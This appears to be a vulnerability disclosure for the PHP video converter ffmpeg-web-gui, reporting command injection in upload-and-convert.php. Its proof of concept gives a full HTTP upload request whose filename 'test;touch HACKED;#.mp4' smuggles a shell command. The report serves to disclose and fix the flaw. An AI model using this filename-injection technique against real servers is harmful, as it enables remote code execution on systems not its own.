# Description

The `ffmpeg-web-gui` project is a simple `video converter` written in `PHP` which uses the `ffmpeg` command to `convert` videos in `HTML` formats.
The issue arises at the following line: https://github.com/swooningfish/ffmpeg-web-gui/blob/master/upload-and-convert.php#L176.
The `arbitrary command injection` is due to `unsafe command concatenation` with `user-supplied inputs` which can be manipulated by an attacker and result in complete `RCE` on the server.

# PoC

1. Download the code of the project
2. Put it into a `webserver` root folder (I used `Apache` with `/var/www/html/ffmpeg_web_gui`)
3. Open http://localtest.me/ffmpeg_web_gui/upload-and-convert.php
4. Upload a valid `mp4` file (I used these: https://file-examples-com.github.io/uploads/2017/04/file_example_MP4_480_1_5MG.mp4)
5. Intercept the request with Burp and change the `filename` into `test;touch HACKED;#`
6. The request will be like:

```http
POST /ffmpeg_web_gui/upload-and-convert.php HTTP/1.1
Host: localtest.me
Content-Length: 1571624
Cache-Control: max-age=0
Origin: http://localtest.me
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMFH7A2ecHBQQMhZu
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localtest.me/ffmpeg_web_gui/upload-and-convert.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,it;q=0.8,ru;q=0.7
Connection: close

------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="file"; filename="test;touch HACKED;#.mp4"
Content-Type: video/mp4

<video_data_binary>
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="video_size"

560x304
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="video_bitrate"

700
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="video_framerate"

30
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_video_deinterlace"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_enable_audio"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_audio_sampling_rate"

44100
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_audio_bitrate"

128
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_audio_channels"

stereo
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_x264"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_ogv"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_webm"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="encoding_stills"

on
------WebKitFormBoundaryMFH7A2ecHBQQMhZu
Content-Disposition: form-data; name="submit"

Upload and convert
------WebKitFormBoundaryMFH7A2ecHBQQMhZu--

```
